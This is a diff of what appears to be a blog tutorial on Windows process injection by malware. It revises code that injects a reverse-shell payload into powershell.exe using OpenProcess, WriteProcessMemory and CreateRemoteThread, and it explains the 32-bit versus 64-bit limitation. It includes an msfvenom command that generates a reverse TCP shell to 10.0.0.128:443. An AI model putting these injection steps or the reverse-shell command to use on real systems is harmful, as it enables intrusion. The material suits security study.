@@ -8,7 +8,9 @@ categories: malware
 In this entry, we will dive into Windows process injection techniques demonstrated by malware. Malware authors deploy process injection to run malicious code under another process.
 
 ### 1. Payload & Compiling
-Since most malware are 32 bit. All code below will be compiled in `x86 (32 bit)`, with the command `g++.exe <input.cpp> -o <output.exe> --std=c++20 -static`.
+Since most malware are 32-bit. All code below will be compiled in `x86 (32-bit)`, with the command `g++.exe <input.cpp> -o <output.exe> --std=c++20 -static`.
+
+The issue with writing 32-bit malware, is that it faces difficulties working with the memory of 64-bit processes.
 
 A simple reverse TCP shell will be used. The shellcode was generated with the following command - `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.128 LPORT=443 -f c`. I will exclude the payload code in below examples due to its obstruction.
 
@@ -70,8 +72,8 @@ int main() {
 
     while (Process32Next(snapshot, &processEntry)) {
           
-        if (strcmp(processEntry.szExeFile, "CalculatorApp.exe") == 0) {
-            printf("Found CalculatorApp.exe\n");
+        if (strcmp(processEntry.szExeFile, "powershell.exe") == 0) {
+            printf("Found powershell.exe\n");
 
             process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (int) processEntry.th32ProcessID);
             std::cout << "HANDLE: " << process_handle << std::endl;
@@ -102,8 +104,8 @@ Let's run the code and dissect the output. We notice that `CreateRemoteThread` f
 {% highlight powershell %}
 
 C:\Users\root\Desktop
-λ calc_injector.exe
-Found CalculatorApp.exe
+λ injector.exe
+Found powershell.exe
 Calc HANDLE: 0x104
 Remote Buffer: 0xfe0000
 WriteProcessMemory: 1
@@ -111,12 +113,24 @@ Remote Thread: 0
 
 {% endhighlight %}
 
+<br>
+#### 2.2. 32-bit or 64-bit?
+The above example fails, because `CreateRemoteThread` cannot be called from a 32-bit process, to start a thread in a 64-bit process. As stated earlier, this is one of the limitations of 32-bit malware.
+
+Now, let's launch a 32-bit powershell.exe process, and run our malware. 
+![powershell32](/assets/post_assets/process-injection-techniques/powershell32.png)
+
+{% highlight powershell%}
+C:\Users\root\Desktop
+λ injector.exe
+Found powershell.exe
+HANDLE: 0x118
+Remote Buffer: 0x6ac0000
+WriteProcessMemory: 1
+Remote Thread: 0x12c
+{% endhighlight %}
 
 <br>
-#### 2.2. Mandatory Integrity Control.
-Introducing the concept of [Mandatory Integrity Control (MIC)](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control).
+Success!
 
-// Calculator.exe has a low Mandatory Integrity Control (MIC) level.
-// powershell.exe by default is medium
-// high MIC for any process with administrator level
-// Can use GetTokenInformation to find processes with high MIC levels
+![shell1](/assets/post_assets/process-injection-techniques/shell1.png)
